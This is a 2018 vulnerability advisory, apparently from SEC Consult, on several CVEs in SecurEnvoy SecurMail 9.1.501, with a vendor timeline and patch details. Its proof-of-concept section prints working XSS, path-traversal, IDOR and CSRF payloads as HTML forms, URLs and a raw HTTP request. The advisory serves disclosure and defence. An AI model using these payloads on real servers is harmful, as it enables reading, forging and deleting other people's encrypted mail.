@@ -1,0 +1,281 @@
+SEC Consult Vulnerability Lab Security Advisory < 20180312-0 >
+=======================================================================
+              title: Multiple Critical Vulnerabilities
+            product: SecurEnvoy SecurMail
+ vulnerable version: 9.1.501
+      fixed version: 9.2.501 or hotfix patch "1_012018"
+         CVE number: CVE-2018-7701, CVE-2018-7702, CVE-2018-7703, CVE-2018-7704,
+                     CVE-2018-7705, CVE-2018-7706, CVE-2018-7707
+             impact: Critical
+           homepage: https://www.securenvoy.com/
+              found: 2017-11
+                 by: W. Ettlinger (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Sending and receiving encrypted emails is not an easy or simple experience.
+Businesses rely on email with an increasing amount of sensitive data sent across
+their networks. A revolutionary approach that doesn't suffer from the overheads
+of deployment and encryption management; just rock-solid security to give you
+100% confidence in your business communications."
+
+URL: https://www.securenvoy.com/products/securmail/key-features.shtm
+
+
+Business recommendation:
+------------------------
+During a brief crash test of the SecurEnvoy SecurMail application several severe
+vulnerabilities have been identified that break the core security promises of
+the product.
+
+These vulnerabilities open the possibility for several different attack
+scenarios that allow an attacker to read other users' encrypted e-mails and
+overwrite or delete e-mails stored in other users' inboxes.
+
+As we have identified several critical vulnerabilities within a very short time
+frame we expect numerous other vulnerabilities to be present.
+
+As other SecureEnvoy products (besides the analyzed SecurMail) appear
+to be highly integrated (all products are installed with a single setup
+file) we suspect other components to also suffer from severe security deficits.
+
+We recommend not to use SecurEnvoy products (especially SecurMail) in a
+production environment until:
+* a comprehensive security audit has been performed and
+* state of the art security mechanisms have been adopted.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Cross Site Scripting (CVE-2018-7703, CVE-2018-7707)
+SEC Consult did not find any functionality that encodes user input when creating
+HTML pages. Therefore persistent and reflected cross site scripting attacks are
+possible throughout the application.
+
+Some pages fail to properly decode URL encoded parameters. Because of this, cross
+site scripting cannot be exploited on these pages in most browsers.
+
+
+2) Path Traversal (CVE-2018-7705, CVE-2018-7706)
+SEC Consult did not find any path traversal checks throughout the application.
+Since the application uses encrypted files as the primary method of data
+storage, this vulnerability can be exploited at several points.
+
+Using this vulnerability, a legitimate recipient can read mails sent to other
+recipients in plain text!
+
+
+3) Insecure Direct Object Reference (CVE-2018-7704)
+Authorization checks are only partially implemented. This allows a legitimate
+recipient to read mails sent to other users in plain text.
+
+
+4) Missing Authentication and Authorization (CVE-2018-7702)
+In order to send encrypted e-mails a client does not need to authenticate on the
+SecurEnvoy server. Therefore anyone with network access to the server can
+arbitrarily send e-mails that appear to come from an arbitrary sender address.
+
+Moreover, an attacker with network access to the server can re-send previous
+communication to arbitrary recipients. This allows him/her to extract all
+e-mails stored on the server. An attacker could also modify arbitrary messages
+stored on the server.
+
+
+5) Cross Site Request Forgery (CVE-2018-7701)
+SEC Consult did not find any protection against cross site request forgery. An
+attacker could use this vulnerability to delete a victim's e-mail or to
+impersonate the victim and reply to his/her e-mails.
+
+
+Since these vulnerabilities were found during a very short time frame, SEC
+Consult believes that the product may contain a large number of other security
+vulnerabilities. As already several core security promises have been broken
+during this short crash test, no further tests were conducted.
+
+
+Proof of concept:
+-----------------
+1) Cross Site Scripting
+a) The following HTML fragments demonstrates reflected cross site scripting
+   (CVE-2018-7703):
+
+--- snip ---
+<form action="http://<host>/secmail/getmessage.exe" method="POST"
+    enctype="text/plain">
+  <input type="hidden" name="mailboxid"
+
+value=""><script>alert&#40;&apos;xss&apos;&#41;<&#47;script>" />
+  <input type="submit" value="Submit request" />
+</form>
+--- snip ---
+
+b) E-mails that are sent using the HTML format can contain any <script> tags
+   (CVE-2018-7707). These are executed once the victim opens the message in the
+   web interface.
+
+
+2) Path Traversal
+a) The following request demonstrates how the message body of the e-mail with id
+   107 can be overwritten while uploading the body for message 103. The message
+   IDs can easily be guessed since they are assigned sequentially
+   (CVE-2018-7705).
+
+--- snip---
+POST /secupload2/upload.aspx HTTP/1.1
+Host: <host>
+Content-Type: multipart/form-data; boundary=--------822119548
+Content-Length: 309
+
+----------822119548
+Content-Disposition: form-data; name="FileName"
+
+x
+----------822119548
+Content-Disposition: form-data; name="MessageID"
+
+103
+----------822119548
+Content-Disposition: form-data; filename="../107/BODY"
+Content-Type: application/octet-stream
+
+some message
+----------822119548--
+--- snip ---
+
+b) The following link demonstrates how the message body of the e-mail with id
+   107 can be retrieved while only having access to the mail with id 103
+   (CVE-2018-7706):
+
+http://<host>/secmail/getmessage.exe?mailboxid=<mailbox-id>&action=attachment&option1=103&option2=../107/BODY
+
+
+3) Insecure Direct Object Reference (CVE-2018-7704)
+The functionality that allows a recipient to read an e-mail checks whether the
+user is actually authorized to read the requested e-mail. However, by using the
+functionality that allows a user to reply to an e-mail, an attacker can
+manipulate the id that is sent as a URL parameter to read arbitrary e-mails.
+The following link demonstrates the retrieval of the message with id 103. The
+message id can easily be guessed since they are assigned sequentially.
+
+http://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=reply&option1=103
+
+
+4) Missing Authorization (CVE-2018-7702)
+In order to send an e-mail to a recipient the following requests have to be
+made:
+ 1. Execute a GETINFO request in order to request a message id.
+ 2. Upload the message body and the attachments.
+ 3. Execute a STORE request to send the message to the recipients.
+
+Neither of these requests require any authentication. Therefore, also no
+authorization is made. Attack scenarios include:
+a) Extract any message by executing step #3 while specifying an own e-mail
+   address as recipient and the message id to extract.
+b) Overwrite attachments or message bodies of previously sent e-mails by
+   executing step #2 to upload arbitrary content.
+
+
+5) Cross-Site Request Forgery
+SEC Consult did not find any CSRF protection within the web interface. Moreover,
+CSRF attacks are possible against the API used to send e-mails. Since this API
+does not require authentication, being authenticated on the server is not a
+precondition for a successful attack. Instead, the attack exploits the victim's
+network location.
+
+a) The following link demonstrates how e-mails can be deleted using a CSRF
+   attack (CVE-2018-7701):
+
+http://<host>/secmail/getmessage.exe?mailboxid=<mailboxid>&action=delete&option1=103
+
+b) The following HTML fragment demonstrates how the API can be exploited to send
+   an e-mail with an arbitrary message id to an arbitrary recipient (also
+   CVE-2018-7702):
+
+<form action="http://<host>/secserver/securectrl.exe" method="POST"
+    enctype="text/plain">
+ <input type="hidden"
+ name="FLAG&#58;STORE&#13;&#10;VERSION&#58;1&#46;0&#13;&#10;RECIPIENT&#95;MOBILE&#95;LIST&#58;SMTP" value="bob&#64;local&#58;MOBILE&#61;00000&#13;&#10;SENDER&#58;me&#64;local&#13;&#10;RECORDED&#95;DELIVERY&#58;&#13;&#10;SUBJECTB64&#58;AAAA&#13;&#10;MESSAGEID&#58;108&#13;&#10;SENDERMOBILE&#58;000000&#13;&#10;REPLY&#58;False" />
+ <input type="submit" value="Submit request" />
+</form>
+
+
+Vulnerable / tested versions:
+-----------------------------
+The version 9.1.501 was found to be vulnerable. This was the latest version at
+the time of discovery.
+
+
+Vendor contact timeline:
+------------------------
+2017-11-20: Contacting vendor through info <at> securenvoy <dot> com
+2017-11-21: SecureEnvoy requests to upload advisory through their SecurMail
+            instance
+2017-11-22: Uploading advisory to SecurEnvoy's SecurMail instance
+2017-12-13: SecurEnvoy: engineering team is investigating issues;
+            product will be re-engineered; asked for deadline extension until
+            revised software is available
+2017-11-15: Postponing advisory release to 2017-02-21
+2018-01-22: SecurEnvoy sends release notes document for the security patch
+            "1_012018"; Fixed vulnerabilities: Path traversal, Insecure Direct
+            Object Reference, XSS, CSRF; SecurEnvoy instructs customers to
+            configure requiring client certificates for the "secserver" endpoint
+2018-02-22: Asking whether the security patch has been released
+2018-03-01: Asking for status update
+2018-03-01: SecurEnvoy: patch has been released
+2018-03-12: Releasing security advisory
+
+
+Solution:
+---------
+Customers of SecurEnvoy should immediately apply the security patch "1_012018"
+or update to version 9.2.501 of the software.
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Europe | Asia | North America
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/career/index.html
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/contact/index.html
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF W. Ettlinger / @2018
